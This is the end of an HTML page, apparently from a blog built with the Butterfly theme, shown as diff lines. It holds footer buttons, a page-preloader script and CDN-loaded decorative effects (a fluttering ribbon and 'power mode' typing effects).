fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script src="/js/fold2.js"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script></div></body></html>
